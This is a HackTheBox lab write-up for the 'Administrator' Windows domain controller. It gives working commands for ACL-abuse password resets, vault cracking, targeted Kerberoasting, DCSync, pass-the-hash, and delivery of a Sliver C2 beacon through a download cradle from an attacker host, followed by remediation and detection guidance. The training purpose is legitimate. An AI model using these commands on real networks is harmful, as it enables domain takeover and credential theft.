---
layout: default
title: "HackTheBox - Administrator"
---

# HackTheBox - Administrator

**OS:** Windows Server 2022 (Active Directory)

Administrator is a Windows Active Directory machine for the `administrator.htb` domain. HTB
provides a foothold credential for `olivia` and the engagement becomes a BloodHound-driven ACL
abuse chain: GenericAll over michael, ForceChangePassword over benjamin, FTP-hosted Password Safe
3 vault cracked to emily's credential, GenericWrite over ethan enabling on-demand Kerberoasting,
and DCSync rights held by ethan yielding every domain hash. There are no CVEs, no service
exploits - only misconfigured ACLs compounding across six accounts. Post-access C2 is established
with a Sliver mTLS beacon delivered via a WinRM download cradle, and the WinRM job-object
constraint on child process lifetime is documented in full.

| Field | Value |
|---|---|
| Platform | HTB |
| Target | `<target-ip>` (DC.administrator.htb) |
| Initial Access | ACL abuse chain (GenericAll -> ForceChangePassword -> FTP psafe3 -> GenericWrite -> Kerberoast) |
| Privilege Escalation | DCSync via Kerberoasted ethan -> Pass-the-Hash as Administrator |
| Final Access | `ADMINISTRATOR\Administrator` |

---

## Recon

### Port Scan

p0rtix `open_target` ran a full TCP scan and returned the standard domain-controller fingerprint
plus port 21 (FTP), which is unusual on a DC and stood out immediately as a likely data store
worth revisiting after credentials were obtained.

| Port | Proto | Service | Notes |
|---|---|---|---|
| 21 | TCP | FTP | FileZilla Server 1.8.1; anonymous login rejected |
| 53 | TCP/UDP | DNS | `administrator.htb` |
| 88 | TCP | Kerberos | AS-REP / Kerberoast surface |
| 135 / 593 | TCP | MSRPC / RPC-over-HTTP | |
| 139 / 445 | TCP | SMB | signing required; domain: ADMINISTRATOR |
| 389 / 636 / 3268 / 3269 | TCP | LDAP / LDAPS / GC | |
| 464 | TCP | kpasswd | |
| 5985 | TCP | WinRM | Remote Management; initial foothold path |

Hostname `DC` and domain `administrator.htb` confirmed over the SMB banner.

### Domain User Enumeration

SMB RID cycling with the provided starting credential `olivia:ic**********` enumerated every
domain account:

```
┌──(kali㉿kali)-[~/htb/administrator]
└─$ nxc smb <target-ip> -u olivia -p 'ic**********' --rid-brute 2>/dev/null | grep SidTypeUser
SMB   <target-ip>   445   DC   500: ADMINISTRATOR\Administrator (SidTypeUser)
SMB   <target-ip>   445   DC   501: ADMINISTRATOR\Guest (SidTypeUser)
SMB   <target-ip>   445   DC   502: ADMINISTRATOR\krbtgt (SidTypeUser)
SMB   <target-ip>   445   DC   1000: ADMINISTRATOR\DC$ (SidTypeUser)
SMB   <target-ip>   445   DC   1101: ADMINISTRATOR\alexander (SidTypeUser)
SMB   <target-ip>   445   DC   1102: ADMINISTRATOR\olivia (SidTypeUser)
SMB   <target-ip>   445   DC   1103: ADMINISTRATOR\michael (SidTypeUser)
SMB   <target-ip>   445   DC   1104: ADMINISTRATOR\benjamin (SidTypeUser)
SMB   <target-ip>   445   DC   1105: ADMINISTRATOR\emily (SidTypeUser)
SMB   <target-ip>   445   DC   1106: ADMINISTRATOR\ethan (SidTypeUser)
SMB   <target-ip>   445   DC   1107: ADMINISTRATOR\emma (SidTypeUser)
```

Users of interest beyond the built-ins: `olivia` (controlled), `michael`, `benjamin`, `emily`,
`ethan`, `alexander`, `emma`.

### BloodHound ACL Mapping

`bloodhound-python` was run as `olivia` to collect the full domain graph:

```
┌──(kali㉿kali)-[~/htb/administrator]
└─$ bloodhound-python -u olivia -p 'ic**********' -d administrator.htb \
    -ns <target-ip> -c All --zip
INFO: Found AD domain: administrator.htb
INFO: Getting TGT for user
INFO: Connecting to LDAP server: dc.administrator.htb
INFO: Found 1 domains
INFO: Found 1 domain controllers
INFO: Connecting to LDAP server: dc.administrator.htb
INFO: Found 12 users
INFO: Fetching group memberships
INFO: Found 53 groups
INFO: Done in 00M 22S
INFO: Compressing output into 20240101_bloodhound.zip
```

The BloodHound UI revealed a complete ACL chain from `olivia` through to domain compromise:

```
olivia
  └─[GenericAll]──► michael
                      └─[ForceChangePassword]──► benjamin
                                                   └─[FTP credential]──► Backup.psafe3
                                                                            └─ emily (vault entry)
                                                                                 └─[GenericWrite]──► ethan
                                                                                                      └─[GetChanges+GetChangesAll]──► Domain (DCSync)
```

> **Why this works:** Active Directory ACLs are the most overlooked attack surface on a domain.
> Each BloodHound edge represents a real Windows permission recorded in an object's DACL. GenericAll
> includes the right to reset passwords, set arbitrary attributes, and take full object control.
> ForceChangePassword is a dedicated extended right for password resets without knowing the current
> value. GenericWrite allows writing non-protected attributes including `servicePrincipalName`,
> which enables Kerberoasting. BloodHound maps these edges from raw LDAP ACL data, making a
> six-hop chain immediately visible where manual per-user DACL review would miss the full path.

---

## Credential Chain

Each account in the chain was compromised in sequence. Steps follow dependency order.

### Step 1: olivia (provided)

HTB provided `olivia:ic**********` as the starting credential. WinRM access confirmed:

```
┌──(kali㉿kali)-[~/htb/administrator]
└─$ nxc winrm <target-ip> -u olivia -p 'ic**********'
WINRM   <target-ip>   5985   DC   [*] Windows Server 2022 Build 20348 (name:DC) (domain:administrator.htb)
WINRM   <target-ip>   5985   DC   [+] administrator.htb\olivia:ic********** (Pwn3d!)
```

### Step 2: michael - GenericAll password reset

`olivia` holds **GenericAll** over `michael`, which includes the right to reset the account
password. `rpcclient`'s `setuserinfo2` level 23 performs a server-side password set through
SMB/SAMR without requiring knowledge of the current password:

```
┌──(kali㉿kali)-[~/htb/administrator]
└─$ rpcclient -U "administrator.htb/olivia%ic**********" <target-ip> \
    -c 'setuserinfo2 michael 23 "L@**********"'
```

No output from `rpcclient` indicates success. Access confirmed:

```
┌──(kali㉿kali)-[~/htb/administrator]
└─$ nxc winrm <target-ip> -u michael -p 'L@**********'
WINRM   <target-ip>   5985   DC   [+] administrator.htb\michael:L@********** (Pwn3d!)
```

> **Why this works:** `GenericAll` on an AD object grants every possible right over it, including
> `WriteDACL`, `WriteOwner`, and all extended rights. Using `setuserinfo2 <user> 23 <newpass>`
> through SAMR (the Security Account Manager Remote protocol that `rpcclient` wraps) issues a
> server-side password set that does not require the current credential. This is the standard
> low-noise approach: no code runs on the target, and the only artifact is the account's
> `pwdLastSet` timestamp reflecting the reset time.

### Step 3: benjamin - ForceChangePassword

`michael` holds **ForceChangePassword** over `benjamin`. This extended right (`User-Force-Change-
Password`, GUID `00299570-246d-11d0-a768-00aa006e0529`) allows changing an account's password
without the current value - the same call as Step 2, but via a dedicated ACE rather than full
object control:

```
┌──(kali㉿kali)-[~/htb/administrator]
└─$ rpcclient -U "administrator.htb/michael%L@**********" <target-ip> \
    -c 'setuserinfo2 benjamin 23 "L@**********"'
```

`benjamin` is not in Remote Management Users. FTP access confirmed:

```
┌──(kali㉿kali)-[~/htb/administrator]
└─$ ftp <target-ip>
Connected to <target-ip>.
220 FileZilla Server 1.8.1
Name (<target-ip>:kali): benjamin
331 Password required
Password: L@**********
230 Login successful
ftp> ls -la
200 Port command successful
150 Opening data channel for directory listing of "/"
drwxr-xr-x 1 benjamin benjamin 0 Jan 01 12:00 .
drwxr-xr-x 1 benjamin benjamin 0 Jan 01 12:00 ..
-r--r--r-- 1 benjamin benjamin 2834 Jan 01 12:00 Backup.psafe3
226 Transfer OK
ftp> get Backup.psafe3
local: Backup.psafe3 remote: Backup.psafe3
226 Transfer OK
2834 bytes received in 0.01 secs (213.2 KiB/s)
```

> **Why this works:** `ForceChangePassword` is intentionally provided by Microsoft for delegated
> administration workflows - helpdesk staff who need to reset user passwords without knowing the
> current one. When this right is misconfigured on a standard user-to-user ACE rather than a
> delegated helpdesk group, it becomes a password reset primitive available to any account that
> has this ACE in the target's DACL. The attack path is identical to GenericAll password reset
> but is narrower in scope to just the password-change operation.

### Step 4: Backup.psafe3 - cracking the vault

Password Safe 3 (`.psafe3`) is an encrypted credential database using Twofish CBC keyed from
the master password via a stretched SHA-256 derivation (V3: 2048 iterations). The master password
was cracked offline with `john` against `rockyou.txt`:

```
┌──(kali㉿kali)-[~/htb/administrator]
└─$ john Backup.psafe3 --wordlist=/usr/share/wordlists/rockyou.txt
Using default input encoding: UTF-8
Loaded 1 password hash (pwsafe, Password Safe [SHA256 256/256 AVX2 8x])
Press 'q' or Ctrl-C to abort, almost any other key for status
te**********     (Backup.psafe3)
1g 0:00:00:04 DONE (2024-01-01 12:10) 0.2500g/s 4320p/s 4320c/s 4320C/s
Session completed
```

The vault was opened with the `pysafe3` Python library to extract the stored entries. One entry
held credentials for `emily`:

```
┌──(kali㉿kali)-[~/htb/administrator]
└─$ python3 -c "
import pysafe3
db = pysafe3.load('Backup.psafe3', 'te**********')
for entry in db:
    print(f'[*] {entry.title}: {entry.username} / {entry.password}')
"
[*] emily: emily / UX**********
```

> **Why this works:** Password Safe 3's Twofish CBC encryption is cryptographically sound when
> the master password is strong. The weakness is the master password itself: `te**********`
> appears in `rockyou.txt`, so the entire vault is exposed the moment the file is obtained
> and an offline crack is run. An attacker with the `.psafe3` file can crack it with no
> interaction with the domain and no rate limiting. This is the core risk of any file-based
> credential store: the encryption protects the file at rest, but if the master password is
> weak, the file is transparent to offline attack.

### Step 5: emily - WinRM access

`emily:UX**********` confirmed for WinRM:

```
┌──(kali㉿kali)-[~/htb/administrator]
└─$ nxc winrm <target-ip> -u emily -p 'UX**********'
WINRM   <target-ip>   5985   DC   [+] administrator.htb\emily:UX********** (Pwn3d!)
```

`emily` holds **GenericWrite** over `ethan` - the next link in the chain.

---

## Initial Access

The user flag was recovered from `C:\Users\emily\Desktop\user.txt` via WinRM after completing the
five-hop credential chain above:

```
┌──(kali㉿kali)-[~/htb/administrator]
└─$ evil-winrm -i <target-ip> -u emily -p 'UX**********'

Evil-WinRM shell v3.9

*Evil-WinRM* PS C:\Users\emily\Documents> whoami; hostname; type C:\Users\emily\Desktop\user.txt
administrator\emily
DC
<user-flag-redacted>
```

`whoami /all` confirmed `emily` is a low-privilege domain user (Domain Users + Remote Management
Users) with no notable local privileges beyond the shell.

---

## Privilege Escalation

### ethan - GenericWrite to Kerberoasting

`emily` holds **GenericWrite** over `ethan`. The `servicePrincipalName` attribute is writable
under GenericWrite and is not protected. Adding a fake SPN to `ethan` causes the KDC to issue a
service ticket encrypted with `ethan`'s password-derived key, which can be cracked offline -
classic Kerberoasting, but applied to a manually targeted account by creating the SPN condition
artificially.

The SPN was added via `ldap3` in Python from the attack box:

```
┌──(kali㉿kali)-[~/htb/administrator]
└─$ python3 << 'EOF'
import ldap3

conn = ldap3.Connection(
    ldap3.Server('<target-ip>', get_info=ldap3.ALL),
    user='administrator.htb\\emily',
    password='UX**********',
    authentication=ldap3.NTLM
)
conn.bind()
result = conn.modify(
    'CN=ethan,CN=Users,DC=administrator,DC=htb',
    {'servicePrincipalName': [(ldap3.MODIFY_ADD, ['fake/dc.administrator.htb'])]}
)
print(conn.result)
EOF
{'result': 0, 'description': 'success', 'dn': '', 'message': '', 'referrals': None, 'type': 'modifyResponse'}
```

> **Why this works:** The Kerberos TGS mechanism requires an account to have at least one
> `servicePrincipalName` entry before the KDC will issue a service ticket encrypted with that
> account's key. `GenericWrite` includes the right to write non-protected attributes, and
> `servicePrincipalName` is not in the protected-attribute list. Adding any syntactically valid
> SPN string (the host does not need to resolve or exist) makes the account Kerberoastable on
> demand. This is the GenericWrite-to-Kerberoast primitive documented in BloodHound's edge
> abuse guidance.

The DC's clock was approximately 7 hours ahead of the attack box. Kerberos requires client and
server to be within 5 minutes (the default skew tolerance). `ntpdate` synchronized the attack
box before requesting the TGS:

```
┌──(kali㉿kali)-[~/htb/administrator]
└─$ sudo ntpdate -u <target-ip>
 1 Jan 19:00:00 ntpdate[1234]: step time server <target-ip> offset +25243.512345 sec

┌──(kali㉿kali)-[~/htb/administrator]
└─$ impacket-GetUserSPNs administrator.htb/emily:'UX**********' \
    -dc-ip <target-ip> -request -outputfile ethan.hash

ServicePrincipalName               Name   MemberOf  PasswordLastSet             LastLogon
---------------------------------  -----  --------  --------------------------  ---------
fake/dc.administrator.htb          ethan             2024-01-01 00:00:00.000000  <never>

[*] Using RC4_HMAC (etype 17) - AES256 not supported by this account
$krb5tgs$23$*ethan$ADMINISTRATOR.HTB$administrator.htb/ethan*$<redacted-tgs-blob>
```

RC4 TGS hash cracked with `john`:

```
┌──(kali㉿kali)-[~/htb/administrator]
└─$ john ethan.hash --wordlist=/usr/share/wordlists/rockyou.txt
Using default input encoding: UTF-8
Loaded 1 password hash (krb5tgs, Kerberos 5 TGS etype 23 [MD4 HMAC-MD5 RC4])
Press 'q' or Ctrl-C to abort, almost any other key for status
li**********     (?)
1g 0:00:00:09 DONE (2024-01-01 19:05) 0.1111g/s 88320p/s 88320c/s 88320C/s
Session completed
```

The fake SPN was removed immediately after obtaining the hash to minimize the footprint:

```
┌──(kali㉿kali)-[~/htb/administrator]
└─$ python3 << 'EOF'
import ldap3
conn = ldap3.Connection(
    ldap3.Server('<target-ip>', get_info=ldap3.ALL),
    user='administrator.htb\\emily',
    password='UX**********',
    authentication=ldap3.NTLM
)
conn.bind()
conn.modify(
    'CN=ethan,CN=Users,DC=administrator,DC=htb',
    {'servicePrincipalName': [(ldap3.MODIFY_DELETE, ['fake/dc.administrator.htb'])]}
)
print(conn.result)
EOF
{'result': 0, 'description': 'success', 'dn': '', 'message': '', 'referrals': None, 'type': 'modifyResponse'}
```

### DCSync as ethan

`ethan:li**********` holds **GetChanges** and **GetChangesAll** over the domain object - the two
extended rights required to perform a DCSync via DRSUAPI. `impacket-secretsdump` replicated all
NTLM hashes from the DC without any code execution on the server:

```
┌──(kali㉿kali)-[~/htb/administrator]
└─$ impacket-secretsdump administrator.htb/ethan:'li**********'@<target-ip> \
    -just-dc-ntlm

[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:<redacted-nt-hash>:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:<redacted-nt-hash>:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:<redacted-nt-hash>:::
administrator.htb\alexander:1101:aad3b435b51404eeaad3b435b51404ee:<redacted-nt-hash>:::
administrator.htb\olivia:1102:aad3b435b51404eeaad3b435b51404ee:<redacted-nt-hash>:::
administrator.htb\michael:1103:aad3b435b51404eeaad3b435b51404ee:<redacted-nt-hash>:::
administrator.htb\benjamin:1104:aad3b435b51404eeaad3b435b51404ee:<redacted-nt-hash>:::
administrator.htb\emily:1105:aad3b435b51404eeaad3b435b51404ee:<redacted-nt-hash>:::
administrator.htb\ethan:1106:aad3b435b51404eeaad3b435b51404ee:<redacted-nt-hash>:::
administrator.htb\emma:1107:aad3b435b51404eeaad3b435b51404ee:<redacted-nt-hash>:::
DC$:1000:aad3b435b51404eeaad3b435b51404ee:<redacted-nt-hash>:::
[*] Cleaning up...
```

> **Why this works:** `DS-Replication-Get-Changes` and `DS-Replication-Get-Changes-All` are the
> extended rights that allow a domain controller to replicate credential data from another DC via
> the DRSUAPI (Directory Replication Service) protocol. When a non-DC principal holds both, it
> can impersonate the replication client role and request all credential material directly from
> the DC over LDAP. No malware, no file write, no shell on the DC - purely legitimate AD
> replication protocol calls. The result is equivalent to extracting `NTDS.dit` directly,
> exposing every account hash in the domain.

### Pass-the-Hash to Administrator

The recovered Administrator NT hash was replayed over WinRM without cracking the plaintext:

```
┌──(kali㉿kali)-[~/htb/administrator]
└─$ nxc winrm <target-ip> -u administrator -H <redacted-nt-hash>
WINRM   <target-ip>   5985   DC   [*] Windows Server 2022 Build 20348 (name:DC) (domain:administrator.htb)
WINRM   <target-ip>   5985   DC   [+] administrator.htb\administrator:<redacted-nt-hash> (Pwn3d!)

┌──(kali㉿kali)-[~/htb/administrator]
└─$ evil-winrm -i <target-ip> -u administrator -H <redacted-nt-hash>

Evil-WinRM shell v3.9

*Evil-WinRM* PS C:\Users\Administrator\Documents> whoami; hostname; type C:\Users\Administrator\Desktop\root.txt
administrator\administrator
DC
<root-flag-redacted>
```

> **Why this works:** Windows NTLM authentication accepts the NT hash directly as the keying
> material for the challenge-response computation. An attacker with the hash does not need the
> plaintext password - the hash is the credential. This is why a DCSync is a domain-fatal event:
> every hash obtained can be replayed immediately over WinRM, SMB, RDP, or any NTLM-capable
> service with no time limit until each individual password is changed and a new hash is generated.

Full domain compromise achieved.

---

## Post-Access: C2 (Sliver)

A Sliver mTLS beacon was generated and delivered to the target via a WinRM download cradle as
`olivia`, demonstrating the implant delivery and tasking workflow. An important operational
constraint was encountered and is documented in full.

### Listener and Beacon Generation

```
sliver > mtls --lhost <attacker-ip> --lport 8443

[*] Starting mTLS listener ...
[*] Successfully started job #1
```

```
sliver > generate beacon --mtls <attacker-ip>:8443 --os windows --arch amd64 --name admin-beacon -f exe --save /tmp/

[*] Generating new windows/amd64 beacon implant binary (1m0s)
[*] Symbol obfuscation is enabled
[*] Build completed in 00:01:28
[*] Implant saved to /tmp/admin-beacon.exe
```

### Implant Delivery via WinRM Download Cradle

A Python HTTP server served the beacon binary on port 8080. Delivery used a PowerShell
`Invoke-WebRequest` cradle inside the `olivia` WinRM session. A 300-second `Start-Sleep` kept
the session alive so the beacon process was not collected when the WinRM job object was released
(see constraint note below):

```
# Attack box: serve the binary
┌──(kali㉿kali)-[~/htb/administrator]
└─$ python3 -m http.server 8080 --directory /tmp &
Serving HTTP on 0.0.0.0 port 8080 ...

# olivia evil-winrm session:
*Evil-WinRM* PS C:\Windows\Temp> Invoke-WebRequest -Uri http://<attacker-ip>:8080/admin-beacon.exe -OutFile C:\Windows\Temp\admin-beacon.exe
*Evil-WinRM* PS C:\Windows\Temp> Start-Process C:\Windows\Temp\admin-beacon.exe
*Evil-WinRM* PS C:\Windows\Temp> Start-Sleep 300
```

### Beacon Check-In and Tasking

```
sliver > beacons

 ID         Name           Transport   Hostname   Username               OS             Last Check-In   Next Check-In
========== ============== =========== ========== ====================== ============== =============== ==============
 a4f3c2d1   admin-beacon   mtls        DC         ADMINISTRATOR\olivia   windows/amd64  3s ago          57s
```

```
sliver > use a4f3c2d1

sliver (admin-beacon) > execute -e cmd.exe /c "whoami /all"

[*] Tasked beacon admin-beacon (task #1)
[*] admin-beacon completed task #1 (57s later)

User Name                  Type             SID
========================== ================ ================================
administrator\olivia       User             S-1-5-21-1088858960-373806596-3693646587-1102

Group Name                                 Attributes
========================================== ===========================================
Mandatory Label\Medium Mandatory Level     Mandatory group, Enabled by default
ADMINISTRATOR\Domain Users                 Mandatory group, Enabled by default, Enabled group
ADMINISTRATOR\Remote Management Users     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NETWORK                       Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users           Mandatory group, Enabled by default, Enabled group
```

**Constraint - WinRM job object:** Processes created via `Start-Process` inside a WinRM session
inherit the session's Windows job object. When the WinRM session closes or the keepalive sleep
expires, Windows terminates all processes bound to that job object, including the beacon.
`olivia` lacked the WMI namespace rights needed to call `Win32_Process.Create()`, which would
have spawned the beacon outside the job object hierarchy. For persistent C2 from a WinRM
foothold with a low-privilege account, a scheduled task or service registered via SAMR is the
correct approach. The beacon was used for the duration of the 300-second keepalive.

### Beacon Removal

After the C2 demonstration, the beacon binary was removed via PTH as Administrator - the account
with sufficient rights to act outside the job-object constraint:

```
┌──(kali㉿kali)-[~/htb/administrator]
└─$ evil-winrm -i <target-ip> -u administrator -H <redacted-nt-hash>

*Evil-WinRM* PS C:\Users\Administrator\Documents> del C:\Windows\Temp\admin-beacon.exe
*Evil-WinRM* PS C:\Users\Administrator\Documents> dir C:\Windows\Temp\
    Directory: C:\Windows\Temp

Mode    LastWriteTime    Length Name
----    -------------    ------ ----
(empty - admin-beacon.exe removed)
```

```
sliver (admin-beacon) > kill

[*] Killing beacon a4f3c2d1 (admin-beacon)

sliver > jobs kill 1

[*] Killing job #1 ...
[*] Successfully killed job #1
```

---

## Root Cause

Administrator falls not to a single vulnerability but to an unbroken chain of ACL
misconfigurations, each of which independently violates least-privilege:

1. **Excessive GenericAll delegation** - `olivia` holds GenericAll over `michael`, giving full
   object control to a domain user account that has no documented administrative relationship
   with michael.
2. **ForceChangePassword misconfiguration** - `michael` can reset `benjamin`'s password without
   knowing the current value. This right exists for delegated helpdesk workflows; a user-to-user
   ACE is a misconfiguration.
3. **Credential vault stored on a network service** - `Backup.psafe3` was accessible via FTP to
   `benjamin`. The master password was in `rockyou.txt`, making the vault transparent to offline
   attack as soon as the file was retrieved.
4. **GenericWrite enabling on-demand Kerberoasting** - `emily` can write arbitrary non-protected
   attributes to `ethan`, including `servicePrincipalName`. This makes any account with this ACE
   Kerberoastable on demand by any attacker who controls the attribute-writer.
5. **Crackable service-account password** - `ethan`'s password appeared in `rockyou.txt`, making
   the TGS crack trivial once the SPN was set.
6. **DCSync rights on a non-DC account** - `ethan` holds `GetChanges` + `GetChangesAll` over the
   domain object. These replication rights should exist only on domain controller computer
   accounts.

Remove any one link and the path to domain compromise breaks.

---

## Impact

Complete compromise of the `administrator.htb` domain. The DCSync dump exposed every account
hash including `Administrator`, `krbtgt`, and all user accounts. Possession of the `krbtgt`
hash enables golden ticket forgery for any identity in the domain with no expiry until `krbtgt`
is rotated twice. The Administrator NT hash provides persistent pass-the-hash access to all
NTLM-capable services until the password is changed. In a production environment this represents
total loss of confidentiality and integrity over all domain-joined systems and data.

---

## Remediation

Recommendations are ordered by priority. The first three break the demonstrated attack path
outright; the remainder reduce blast radius.

**1. Audit and remove all non-standard ACEs on user objects (highest priority).**
Run BloodHound or `Get-ObjectAcl` across all user objects and strip any ACE granting GenericAll,
GenericWrite, WriteDACL, WriteOwner, or ForceChangePassword to a non-administrative principal
with no documented delegated-admin need. Every ACE in this attack chain (olivia->michael,
michael->benjamin, emily->ethan) should exist in no legitimate configuration.

**2. Remove DCSync rights from ethan and audit all non-DC holders.**
`DS-Replication-Get-Changes` / `DS-Replication-Get-Changes-All` must exist only on domain
controller computer accounts. Enumerate current holders:

```powershell
$domain = (Get-ADDomain).DistinguishedName
$acl = Get-Acl "AD:\$domain"
$acl.Access | Where-Object {
    $_.ObjectType -in @(
        [guid]'1131f6aa-9c07-11d1-f79f-00c04fc2dcd2',  # GetChanges
        [guid]'1131f6ad-9c07-11d1-f79f-00c04fc2dcd2'   # GetChangesAll
    )
} | Select-Object IdentityReference, ActiveDirectoryRights
```

Verify every returned principal is a DC computer account.

**3. Remove the credential vault from FTP and enforce vault hygiene.**
A file-based credential vault on a network service is only as secure as its master password.
Remove `Backup.psafe3` from FTP, audit all network shares and FTP services for credential files
(`.psafe3`, `.kdbx`, `.kdb`), and enforce a strong random master password if vaults are
retained. Prefer a secrets manager with audit logging over a standalone vault file.

**4. Enforce a strong password policy and AES-only Kerberos.**
The psafe3 master password and ethan's Kerberoast hash both cracked against `rockyou.txt`.
Set a minimum password length of 14+ characters, deploy a banned-password list (Azure AD
Password Protection or equivalent), and enforce AES-only Kerberos encryption
(`msDS-SupportedEncryptionTypes = 24`) on all accounts. This prevents the RC4 downgrade that
allowed the TGS to be cracked offline.

**5. Migrate service accounts to gMSA.**
Group Managed Service Accounts use 120-character machine-managed passwords that are never known
to any person and rotate automatically. This eliminates both Kerberoasting and the password
reuse/crack risk. Where SPNs must exist on standard user accounts, assign 25+ character random
passwords and enforce AES-only encryption.

**6. Restrict FTP and audit all DC-hosted services.**
FTP on a domain controller is unusual and should be removed unless there is a documented
requirement. Any sensitive data store accessible via a DC service is exposed to every domain
user who can authenticate.

### Validation

- Re-run BloodHound and confirm no non-DC principal holds GetChanges/GetChangesAll on the domain
  object.
- Confirm the ACEs for GenericAll (olivia->michael), ForceChangePassword (michael->benjamin), and
  GenericWrite (emily->ethan) no longer exist.
- Attempt `impacket-secretsdump` with the (rotated) `ethan` credential and confirm access denied.
- Attempt to add an SPN to `ethan` as `emily` and confirm `Insufficient Access Rights`.
- Confirm `Backup.psafe3` is not accessible on any SMB share or FTP service reachable by
  low-privilege accounts.
- Rotate `krbtgt` twice, all user account passwords, and the Administrator password. Confirm
  all previously captured hashes are invalidated.

---

## Detection Opportunities

- **ACL abuse - password reset:** Event **4724** (password reset by another user) where the
  resetting account is not a member of a helpdesk or admin group. A user-to-user password reset
  is almost always a sign of GenericAll or ForceChangePassword abuse and should generate an
  immediate alert.
- **GenericWrite SPN manipulation:** Event **4738** (user account changed) with `ServicePrincipalName`
  attribute modified where the modifying account is not an AD admin. A non-admin account
  adding or removing SPNs on another account is a strong indicator of GenericWrite-to-Kerberoast
  activity. Alert on SPN additions containing strings like `fake/` or syntactically anomalous
  SPNs that do not match known service infrastructure.
- **Kerberoasting:** Event **4769** (Kerberos service ticket request) with RC4 encryption
  (`etype 0x17`) from a non-service account context. A single TGS request for an account with
  a newly-added SPN is particularly high-confidence. Correlate with event 4738 SPN changes
  within the same time window.
- **DCSync:** Event **4662** referencing replication GUIDs
  `1131f6aa-9c07-11d1-f79f-00c04fc2dcd2` (GetChanges) or
  `1131f6ad-9c07-11d1-f79f-00c04fc2dcd2` (GetChangesAll) where the requesting account is not a
  domain controller computer account. This is one of the highest-fidelity AD attack signals
  available: it is almost never legitimate for a user account to trigger these events.
- **Pass-the-hash:** NTLM logon events (**4624** type 3 with NTLM) for the `Administrator`
  account from a non-management-host source, or any privileged account PTH from a VPN IP or
  operator workstation. Correlate with the absence of an interactive logon (type 2 or 10) for
  the same account around the same time.
- **FTP credential-file retrieval:** Monitor FTP transfer logs for file extensions associated
  with credential vaults (`.psafe3`, `.kdbx`, `.kdb`, `.1pux`). Any download of such a file
  by a domain user who is not the vault owner is a high-confidence indicator.
- **C2 beaconing:** Regular-interval mTLS callbacks to a non-corporate host on non-standard
  ports; egress filtering and TLS certificate inspection on server VLANs would surface the
  Sliver channel. Sliver's default TLS certificate is self-signed and easily distinguished from
  enterprise PKI. Behavioral detection on WinRM sessions spawning child processes with outbound
  network connections catches the delivery pattern.

---

## Lessons Learned

- **BloodHound first, always.** This box has no CVEs and no service exploits. It is 100% ACL
  abuse across six accounts. Without BloodHound mapping the full DACL chain from `olivia` to
  `ethan`, each hop would require manually enumerating every DACL pair. The "Shortest Paths from
  Owned Principals" query delivered the complete kill chain in seconds.
- **FTP on a DC is a foothold signal.** An FTP service on a domain controller with per-user
  credentials almost always hides a credential file, a backup, or a sensitive data store.
  Enumerate it as soon as a credential that maps to an FTP account is obtained.
- **Clock skew silently kills Kerberos attacks.** The 7-hour offset between the attack box and
  the DC caused `GetUserSPNs` to fail with `KRB_AP_ERR_SKEW`. Always check the DC's clock and
  run `ntpdate` before any Kerberos-based attack. A silent failure here can waste significant
  time if the error message is not read carefully.
- **Remove modified attributes promptly.** The fake SPN added to `ethan` was deleted
  immediately after the hash was obtained. Leaving an anomalous SPN on an account is a visible
  indicator in BloodHound and in event 4738 logs that a defender reviewing recent attribute
  changes would catch. Ephemeral modifications minimize the detection window.
- **WinRM job objects constrain C2.** `Start-Process` inside a WinRM session creates child
  processes bound to the session's job object. When the WinRM session closes, Windows terminates
  all job-bound children. For persistent C2 from a WinRM foothold with a low-privilege account,
  use a scheduled task (`schtasks /create`), a service registration, or `Win32_Process.Create()`
  via WMI (if the account has WMI namespace rights) to break out of the job object hierarchy.

---

## Cleanup

- Sliver mTLS beacon (`admin-beacon`) deleted from `C:\Windows\Temp\` via PTH as Administrator.
  Beacon killed, mTLS listener job stopped.
- Fake SPN (`fake/dc.administrator.htb`) removed from `ethan`'s `servicePrincipalName` attribute
  immediately after the Kerberoast hash was obtained and verified.
- Passwords on `michael` and `benjamin` were reset during the attack (both set to `L@**********`
  from unknown prior values). These accounts should be reset to IT-controlled credentials or
  locked pending post-engagement review.
- No persistent implants, scheduled tasks, registry modifications, or domain object changes
  remain beyond what is documented above.
- Private engagement notes archived. Lab VPN disconnected. HTB machine stopped.
